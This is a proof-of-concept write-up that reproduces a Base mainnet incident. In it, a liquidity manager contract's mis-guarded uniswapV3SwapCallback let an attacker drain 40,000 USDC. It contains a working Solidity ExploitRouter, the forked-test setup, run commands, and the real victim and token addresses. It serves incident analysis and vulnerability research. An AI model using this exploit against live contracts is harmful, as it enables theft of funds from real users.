## Overview & Context

This proof-of-concept (PoC) reproduces the Base mainnet incident in which a victim liquidity manager contract at `0x8d2Ef0d39A438C3601112AE21701819E13c41288` lost 40,000.0 USDC to an adversary via a mis-guarded `uniswapV3SwapCallback`. The root-cause analysis classifies this as a **protocol_bug**: the victim authenticates `msg.sender` against an address derived from caller-controlled calldata instead of a fixed registry or whitelist of genuine pools, allowing an arbitrary router to pass the check and drain the victim’s USDC balance.

The Forge-based PoC:

- Forks **Base mainnet** at the pre-exploit block immediately before the real incident.
- Interacts with the **real USDC proxy** (`0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`) and the **real victim contract**.
- Deploys a fresh adversary router that reconstructs the exploit flow described in the root-cause report.
- Implements explicit oracles that confirm attacker profit and victim depletion in USDC.

### How to Run the PoC

From the session root, with `QUICKNODE_ENDPOINT_NAME` and `QUICKNODE_TOKEN` defined in `.env`:

```bash
cd /home/wesley/TxRayExperiment/incident-202601020700
export RPC_URL="https://${QUICKNODE_ENDPOINT_NAME}.base-mainnet.quiknode.pro/${QUICKNODE_TOKEN}"
cd forge_poc
RPC_URL="$RPC_URL" forge test --via-ir -vvvvv \
  > ../artifacts/poc/poc_validator/forge-test.log 2>&1
```

On success, `ExploitTest::testExploit()` passes and the trace shows USDC moving from the victim to the custom `ExploitRouter`, then to the attacker EOA.

---

## PoC Architecture & Key Contracts

### Main Contracts and Roles

- **USDC token (`IERC20 usdc_token`)**  
  Canonical USDC proxy on Base at `0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`, using the real on-chain implementation and storage.

- **Victim liquidity manager (`IVictimCallback victim_contract`)**  
  Real victim contract at `0x8d2Ef0d39A438C3601112AE21701819E13c41288`, accessed only through its `uniswapV3SwapCallback` interface.

- **Fresh attacker EOA (`attacker`)**  
  A new address created with `makeAddr("attacker")`, funded with native gas but starting with zero USDC. It plays the adversary role without reusing any real attacker identity.

- **Custom exploit router (`ExploitRouter`)**  
  A locally deployed helper contract that reconstructs the adversary’s capability:
  - Reads the victim’s USDC balance.
  - Crafts callback calldata so that the victim’s flawed authentication resolves back to the router address.
  - Calls the victim’s `uniswapV3SwapCallback`.
  - Forwards all drained USDC to the attacker EOA.

### Key Exploit Logic

The core exploit is implemented in the `ExploitRouter` contract:

```solidity
contract ExploitRouter {
    IERC20 public immutable usdc;
    IVictimCallback public immutable victim;
    address public immutable attacker;

    constructor(IERC20 _usdc, IVictimCallback _victim, address _attacker) {
        usdc = _usdc;
        victim = _victim;
        attacker = _attacker;
    }

    function executeExploit() external {
        uint256 victimBalance = usdc.balanceOf(address(victim));
        bytes memory data = abi.encode(address(usdc), address(this));
        victim.uniswapV3SwapCallback(int256(victimBalance), 0, data);
        uint256 routerBalance = usdc.balanceOf(address(this));
        require(usdc.transfer(attacker, routerBalance), "forward to attacker failed");
    }
}
```

**Caption:** Minimal adversary router that mirrors the incident’s exploit flow: it reads the victim’s full USDC balance, triggers the mis-guarded callback with calldata shaped so that the victim’s `msg.sender` check authorizes this router, and forwards the drained USDC to the attacker EOA.

---

## Adversary Execution Flow

The end-to-end exploit flow is implemented in the `ExploitTest` Foundry test and follows the ACT framing (Adversary, Capability, Target).

### 1. Environment Setup and Funding

- The test forks **Base mainnet** at block `34459413`, the pre-state immediately before the incident block `34459414` used in the root-cause analysis.
- It asserts that the fork is running on chain ID `8453` (Base).
- A fresh attacker EOA is created and funded with native gas to pay for transactions, but its initial USDC balance is recorded and used as the baseline for the profit oracle.

Representative snippet:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, EXPLOIT_BLOCK_NUMBER);
    vm.selectFork(forkId);
    assertEq(block.chainid, BASE_CHAIN_ID, "must run on Base fork");

    attacker = makeAddr("attacker");
    vm.deal(attacker, 10 ether);

    exploitRouter = new ExploitRouter(usdc_token, victim_contract, attacker);
}
```

**Caption:** Test setup forks Base mainnet at the pre-exploit block, creates a fresh attacker EOA, funds it with native gas, and deploys the custom exploit router.

### 2. Deployment and Configuration

- The `ExploitRouter` is deployed pointing at the real USDC and victim contracts on the fork.
- `vm.label` is used to assign human-readable labels (`"USDC_Base_FiatTokenProxy"`, `"Victim_LiquidityManager"`, `"ExploitRouter"`, `"Attacker_EOA"`) improving trace readability.
- Oracle pre-checks are executed:
  - The victim’s pre-exploit USDC balance is read and asserted to be strictly positive.
  - The attacker’s initial USDC balance is recorded.

### 3. Exploit Execution

- The test starts a prank as the attacker EOA.
- The attacker invokes `exploitRouter.executeExploit()`.
- Inside the router:
  - The victim’s USDC balance (40,000e6 in the real state) is read.
  - Callback calldata `abi.encode(usdcTokenAddress, routerAddress)` is constructed, matching the pattern reconstructed in the root-cause analysis.
  - `victim.uniswapV3SwapCallback(victimBalance, 0, data)` is called.
- Because the victim computes an address from calldata and compares it to `msg.sender`, and the calldata encodes the router address, the victim incorrectly authenticates the router and transfers its entire USDC balance to the router.

The trace shows:

- `Victim_LiquidityManager::uniswapV3SwapCallback(...)` calling USDC’s `transfer` to send `40000000000` USDC units from the victim to the router.

### 4. Profit Realization and Post-State

- After the callback, the router holds 40,000e6 USDC.
- The router calls `USDC.transfer(attacker, routerBalance)` to forward all USDC to the attacker EOA.
- Post-exploit assertions confirm:
  - The attacker’s USDC balance increased relative to the baseline.
  - The victim’s USDC balance decreased (to zero in the recreated incident).

Representative test function:

```solidity
function testExploit() public {
    assertEq(address(usdc_token), 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

    vm.startPrank(attacker);
    exploitRouter.executeExploit();
    vm.stopPrank();

    uint256 attackerUsdcAfter = usdc_token.balanceOf(attacker);
    assertGt(attackerUsdcAfter, attackerUsdcBefore);

    uint256 victimUsdcAfter = usdc_token.balanceOf(address(victim_contract));
    assertLt(victimUsdcAfter, victimUsdcBefore);
}
```

**Caption:** Main exploit test asserts the USDC asset type, runs the exploit as the attacker, then checks that the attacker profits in USDC and the victim’s USDC balance strictly decreases.

---

## Oracle Definitions and Checks

The PoC explicitly implements the oracles defined in `oracle_definition.json`, treating them as a specification for success.

### Variables

- **`attacker` (role: Attacker)**  
  A simulated adversary EOA, created fresh in the forked environment. Its address is not tied to the real incident attacker.

- **`victim_contract` (role: Victim)**  
  The real on-chain victim liquidity manager at `0x8d2Ef0d39A438C3601112AE21701819E13c41288`.

- **`usdc_token` (role: Token, symbol: USDC)**  
  The Base USDC proxy at `0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`, used as the reference asset for both victim depletion and attacker profit.

### Pre-Checks

1. **Victim holds USDC before exploit**  
   - Oracle description: The victim must have a positive USDC balance before the exploit so there is value to steal.  
   - Implementation: In `setUp`, `victimUsdcBefore = usdc_token.balanceOf(victim_contract)` and an assertion `assertGt(victimUsdcBefore, 0, ...)` ensures the victim is funded.

2. **Record attacker’s initial USDC balance**  
   - Oracle description: Record the attacker’s starting USDC balance to measure net profit.  
   - Implementation: In `setUp`, `attackerUsdcBefore = usdc_token.balanceOf(attacker)` stores the baseline prior to any exploit actions.

### Hard Constraint

- **Asset type: canonical USDC on Base**  
  - Oracle: Profit and victim depletion must be realized in Base USDC at `0x833589fcd6edb6e08f4c7c32d4f71b54bda02913`.  
  - Implementation: At the beginning of `testExploit`, the test asserts `assertEq(address(usdc_token), 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, ...)`.

### Soft Constraints

1. **Attacker profit in USDC**  
   - Oracle: After the exploit, the attacker must end with strictly more USDC than before, with at least a 1-unit increase.  
   - Implementation: After running `executeExploit`, the test reads `attackerUsdcAfter = usdc_token.balanceOf(attacker)` and asserts `assertGt(attackerUsdcAfter, attackerUsdcBefore, ...)`.

2. **Victim depletion in USDC**  
   - Oracle: The victim’s USDC balance must strictly decrease during the exploit, by at least 1 unit (ideally to zero).  
   - Implementation: The test reads `victimUsdcAfter = usdc_token.balanceOf(victim_contract)` and asserts `assertLt(victimUsdcAfter, victimUsdcBefore, ...)`. On the real state, the victim’s balance goes from `40_000e6` to `0`.

Collectively, these checks ensure that the PoC not only runs an exploit-like transaction but also verifies the exact profit-and-loss pattern seen in the incident.

---

## Validation Result and Robustness

### Execution and Logs

- The PoC was executed with:
  - `forge test --via-ir -vvvvv` on a Base mainnet fork, using `RPC_URL` constructed from the configured QuickNode endpoint and token.
  - Detailed traces show:
    - The victim’s USDC balance of `40000000000` units being read.
    - `Victim_LiquidityManager::uniswapV3SwapCallback(...)` transferring `40000000000` USDC units from the victim to `ExploitRouter`.
    - `ExploitRouter` forwarding `40000000000` USDC units from itself to the attacker EOA.
- All tests pass:
  - `ExploitTest::testExploit()`
  - Ancillary `CounterTest` tests (unrelated to the exploit but part of the project).

The validator log is stored at:

```bash
/home/wesley/TxRayExperiment/incident-202601020700/artifacts/poc/poc_validator/forge-test.log
```

### Validator Summary

The PoC validator produced the following high-level verdict:

- **`overall_status`: `Pass`**  
  - The PoC successfully reproduces the exploit on a Base mainnet fork.
  - All specified oracles (pre-checks, hard constraints, soft constraints) are implemented and pass.
  - Quality criteria are satisfied:
    - Oracle alignment with the definition.
    - Clear, human-readable flow with helpful labels.
    - No unexplained magic numbers (only documented protocol constants and a simple gas-funding amount).
    - Self-contained attacker simulation with fresh addresses and locally deployed router.
    - End-to-end attack sequence (funding, deployment, exploit, profit) is covered and asserted.
    - Strong alignment with the root-cause analysis of the mis-guarded callback.
    - Use of a real Base mainnet fork without mocking the victim or USDC.

No further refinements are required for correctness or robustness against the current oracle specification.

---

## Linking PoC Behavior to Root Cause

### Exercising the Vulnerable Logic

The root-cause report identifies the core bug as follows:

- The victim contract implements `uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes data)`.
- Instead of validating `msg.sender` against a fixed pool or registry, it:
  - Decodes an address from `data`.
  - Masks it to 160 bits.
  - Compares it directly against `CALLER` (`msg.sender`).
- Because the address in `data` is attacker-controlled, any router can craft `data` so that the derived address equals its own address and pass the check.

The PoC reproduces exactly this pattern:

- `ExploitRouter.executeExploit()` constructs `data = abi.encode(address(usdc), address(this))`, matching the scheme reconstructed from the incident traces.
- It then calls `victim.uniswapV3SwapCallback(victimBalance, 0, data)` from the router’s address.
- On-chain, the victim decodes the router address from `data` and sees `msg.sender == router`, mistakenly authorizing the router.
- The victim initiates a USDC transfer from its own balance to the router, which is visible in the trace as:
  - `USDC.transfer(ExploitRouter, 40000000000)` with the victim as the sender.

### Demonstrating Victim Loss and Attacker Gain

The PoC’s assertions connect directly to the impact described in the root-cause analysis:

- **Victim Loss:**  
  - Pre-state: `victimUsdcBefore = 40000000000` units (40,000.0 USDC) on the real Base state.  
  - Post-state: `victimUsdcAfter = 0`.  
  - The oracle `assertLt(victimUsdcAfter, victimUsdcBefore, ...)` encodes this depletion predicate and passes.

- **Attacker Gain:**  
  - Pre-state: `attackerUsdcBefore = 0` (fresh EOA).  
  - Post-state: `attackerUsdcAfter = 40000000000`.  
  - The oracle `assertGt(attackerUsdcAfter, attackerUsdcBefore, ...)` confirms strictly positive USDC profit.

This matches the ACT success predicate in the root-cause JSON: the adversary cluster ends with 40,000.0 more USDC than before the exploit, while the victim’s USDC balance is fully drained.

### ACT Framing

- **Adversary (A):**  
  Modeled by the fresh attacker EOA and its locally deployed `ExploitRouter`, which collectively mirror the capabilities of the real adversary cluster (EOA + router) without reusing on-chain attacker identities.

- **Capability (C):**  
  The ability to:
  - Observe the publicly available pre-exploit state (victim funded with USDC, attacker unfunded in USDC).
  - Construct calldata for `uniswapV3SwapCallback` that causes the victim’s faulty authentication to authorize an arbitrary router.
  - Drive a single transaction that drains the victim’s USDC to the adversary.

- **Target (T):**  
  The victim liquidity manager contract holding 40,000e6 USDC. The PoC shows how its mis-guarded callback can be abused to completely deplete this balance while satisfying the same profit-and-loss pattern as in the incident.

In summary, the PoC is a faithful, end-to-end reproduction of the incident’s root cause and impact on a Base mainnet fork, with oracles that make the exploit conditions explicit and machine-checkable.

